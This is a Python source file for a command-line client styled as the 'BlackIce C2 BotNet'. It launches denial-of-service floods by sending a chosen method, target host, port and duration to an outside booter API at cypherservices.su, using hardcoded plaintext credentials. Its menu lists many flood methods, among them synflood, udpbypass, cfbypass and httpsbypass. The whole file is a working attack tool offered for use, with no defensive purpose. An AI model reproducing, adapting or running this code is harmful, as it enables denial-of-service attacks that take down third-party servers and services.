import os
import time
import requests

# ANSI escape codes for color
RESET = "\033[0m"
BOLD = "\033[1m"
WHITE = "\033[37m"
LIGHT_BLUE = "\033[94m"  # Light Blue for prompt
BLUE = "\033[34m"
BLACK = "\033[30m"
RED = "\033[31m"

# API credentials
USERNAME = "Iamgeo1"
PASSWORD = "5671"
API_ENDPOINT = "https://cypherservices.su/api/attack?username={USERNAME}&secret={PASSWORD}&host={HOST}&time={TIME}&port={PORT}&method={METHOD}"

# List of attack methods
ATTACK_METHODS = [
    "homehold", "synflood", "discord", "telegram", "openvpn", "tcpkill", "tcpmix", "udpgostorm", "ovh",
    "ssh", "tcpboom", "udpbypass", "stun", "mixamp", "homekill", "dns", "game", "fivem", "tls", "http",
    "httpsbypass", "browser", "cfbypass"
]

# Clear screen function
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Display menu
def display_menu():
    clear_screen()

    # Title in Blue
    print(f"{BLUE}BLACKICE C2 BotNet\n{RESET}")
    
    # Welcome box in Blue and White
    print(f"{BLUE}+------------------------------------------+{RESET}")
    print(f"{BLUE}| {WHITE}Welcome to the BlackIce C2       {BLUE}|{RESET}")
    print(f"{BLUE}|  {WHITE}Made By Qsecc & Mzz.hm                       |{RESET}")
    print(f"{BLUE}+------------------------------------------+{RESET}")
print("""          ╓g`                                               ⁿ▄,
           ╥▓╢╫                                                  ▐╣▓@,
        ,▓╢╣╣╣▌                                                   ╣╣╣╣▓▄
      ,▓╣╢╣╣╣╣▓                          y                       /╣╣╣╣╣╣▓▄
     ▓╢╣╣╣╣╣╣╣╢▓W                    ╔▓   ▓,                   ,▓╣╣╣╣╣╣╣╣╣▓╖
   ╔▓╣╣╢╢╣╣╣╣╣╣╢╢╣▓▓æ╖,    ,æ     ,g▓▓    ╙╣▓╖     *╖     ,╥@▓▓╣╣╣╣╣╣╣╣╢╢╣╢╣▓
  ╔╢╣╣╢▓▓╣╣╣╣╣╣╣╣╣╣╢╢╣╣╢▓▓▀,,╓╓╓, "▓╣▌     ▓▓▀',,╓╓,,`▀▓▓╢╣╣╣╣╣╣╣╣╣╣╣╣╣╣▓▓╣╣╣▓
 ╒╢╣▓╜ ╒╢╣╣╢▓╜`` `▀╣▓▀`╓@▓╢╢▓▀""╙▀▓▓▄╙╕   ▓`▄▓▓▀╙"╙▀▓╢▓▓▄,"▓╢╢╜```"▀▓╣╣╣▓  ▓╣╣▓
 ▓╣▓   ▓╣▓╜        ▀ ╔▓╣╣▓╜         ▀▓    ╓▓"         ▀╢╣╢▓, ▌        ▓╣╣    ▓╣L
j╢▌    ▓▓           ▓╣╣╫╜             ▓  ╓▀             ▓╣╣╢▄          ╙╢     ▓▓
▐▓     ▐           ▓╣╢╢`      ,╓╖╖,    ▓▓▌    ,╓╓,       ▓╢╣╢r          ▐      ╣
╟'                 ▓╣╣▓     ,▓`    ▀@  ▓╢" ╓▓╜    ▀▄      ╣╢╣▌                 ▓
▐                  ▓╣╣▌     ▓       j▓╕   Æ▓       ╟L     ╣╣╣`                 ╟
 L              ┌   ▓╣▓     ╚▄      "▀▓   ▓▀  ┐    ▓      ╢╣▀                  ▌
                 ▓╖  ╙▓▓     '▓N▄╖▓▄         ▓▓╓▄&▀     ╓▓▓  ,╔▓              /
              g▓▓"  "¬ `▀▓▄,       "▀╖     ▄▀`       ╓@▓╜ ,ⁿ` "▀▓▓╖
            ╒▓"`       ⁿw   "▀R▄,    ▐▓   ▓    ,╓g▓╜"  ,⌐`       "▀▓
                          ▓▓╖    ╙▀▓▓╖╙  ƒ`æ▓▓▀"    ▄▓▌
                        ƒ           ▓▓  ,▓╜           ╙,
                              `"*▓  ,, ▓ ▓ ,. ,▓²"`
                                  ╙N, ▀▓╓▓╜,╓▓
                                     `"▓╣▀"`                            """) 
# Show help and display attack methods
def show_help():
    print(f"\n{BLUE}+------------------------ COMMANDS ------------------------+{RESET}")
    print(f"{WHITE}[help]   - Show this help message{RESET}")
    print(f"{WHITE}[clear]  - Clear the terminal screen{RESET}")
    print(f"{WHITE}[exit]   - Exit the program{RESET}")
    print(f"{BLUE}+---------------------------------------------------------+{RESET}")
    print("""          ╓g`                                               ⁿ▄,
           ╥▓╢╫                                                  ▐╣▓@,
        ,▓╢╣╣╣▌                                                   ╣╣╣╣▓▄
      ,▓╣╢╣╣╣╣▓                          y                       /╣╣╣╣╣╣▓▄
     ▓╢╣╣╣╣╣╣╣╢▓W                    ╔▓   ▓,                   ,▓╣╣╣╣╣╣╣╣╣▓╖
   ╔▓╣╣╢╢╣╣╣╣╣╣╢╢╣▓▓æ╖,    ,æ     ,g▓▓    ╙╣▓╖     *╖     ,╥@▓▓╣╣╣╣╣╣╣╣╢╢╣╢╣▓
  ╔╢╣╣╢▓▓╣╣╣╣╣╣╣╣╣╣╢╢╣╣╢▓▓▀,,╓╓╓, "▓╣▌     ▓▓▀',,╓╓,,`▀▓▓╢╣╣╣╣╣╣╣╣╣╣╣╣╣╣▓▓╣╣╣▓
 ╒╢╣▓╜ ╒╢╣╣╢▓╜`` `▀╣▓▀`╓@▓╢╢▓▀""╙▀▓▓▄╙╕   ▓`▄▓▓▀╙"╙▀▓╢▓▓▄,"▓╢╢╜```"▀▓╣╣╣▓  ▓╣╣▓
 ▓╣▓   ▓╣▓╜        ▀ ╔▓╣╣▓╜         ▀▓    ╓▓"         ▀╢╣╢▓, ▌        ▓╣╣    ▓╣L
j╢▌    ▓▓           ▓╣╣╫╜             ▓  ╓▀             ▓╣╣╢▄          ╙╢     ▓▓
▐▓     ▐           ▓╣╢╢`      ,╓╖╖,    ▓▓▌    ,╓╓,       ▓╢╣╢r          ▐      ╣
╟'                 ▓╣╣▓     ,▓`    ▀@  ▓╢" ╓▓╜    ▀▄      ╣╢╣▌                 ▓
▐                  ▓╣╣▌     ▓       j▓╕   Æ▓       ╟L     ╣╣╣`                 ╟
 L              ┌   ▓╣▓     ╚▄      "▀▓   ▓▀  ┐    ▓      ╢╣▀                  ▌
                 ▓╖  ╙▓▓     '▓N▄╖▓▄         ▓▓╓▄&▀     ╓▓▓  ,╔▓              /
              g▓▓"  "¬ `▀▓▄,       "▀╖     ▄▀`       ╓@▓╜ ,ⁿ` "▀▓▓╖
            ╒▓"`       ⁿw   "▀R▄,    ▐▓   ▓    ,╓g▓╜"  ,⌐`       "▀▓
                          ▓▓╖    ╙▀▓▓╖╙  ƒ`æ▓▓▀"    ▄▓▌
                        ƒ           ▓▓  ,▓╜           ╙,
                              `"*▓  ,, ▓ ▓ ,. ,▓²"`
                                  ╙N, ▀▓╓▓╜,╓▓
                                     `"▓╣▀"`                            """) 

    print(f"\n{BLUE}Available Attack Methods:{RESET}")
    for i, method in enumerate(ATTACK_METHODS, 1):
        print(f"{WHITE}[{i}] {method}{RESET}")

# Get user input for attack
def get_input():
    try:
        command = input(f"{LIGHT_BLUE}[root]~[BlackIce]- {RESET}").strip().lower()

        # Exit command
        if command == 'exit':
            print(f"\n{RED}[!] Shutting down BlackIce...{RESET}")
            exit()

        # Help command
        elif command == 'help':
            show_help()

        # Clear screen command
        elif command == 'clear':
            clear_screen()
            display_menu()

        else:
            # Attempt to split the command into components (attack method, host, port, duration)
            parts = command.split()
            if len(parts) == 4:
                method = parts[0]
                host = parts[1]
                port = parts[2]
                duration = parts[3]

                # Check if method is valid
                if method in ATTACK_METHODS:
                    print(f"\n{BLUE}Launching attack...{RESET}")
                    send_attack(method, host, port, duration)
                else:
                    print(f"\n{RED}Invalid attack method.{RESET}")
            else:
                print(f"\n{RED}Invalid input. Please provide method, host, port, and duration.{RESET}")

    except Exception as e:
        print(f"\n{RED}Error: {e}{RESET}")

# Send attack request
def send_attack(method, host, port, duration):
    url = API_ENDPOINT.format(
        USERNAME=USERNAME,
        PASSWORD=PASSWORD,
        HOST=host,
        PORT=port,
        TIME=duration,
        METHOD=method
    )
    response = requests.get(url)

    if response.status_code == 200:
        print(f"\n{BLUE}Booted By BlackIce.... {host}:{port} using {method} for {duration} seconds!{RESET}")
    else:
        print(f"\n{RED}Error: {response.text}{RESET}")

    time.sleep(3)
    main()

# Main function
def main():
    display_menu()
    while True:
        get_input()

if __name__ == "__main__":
    main()
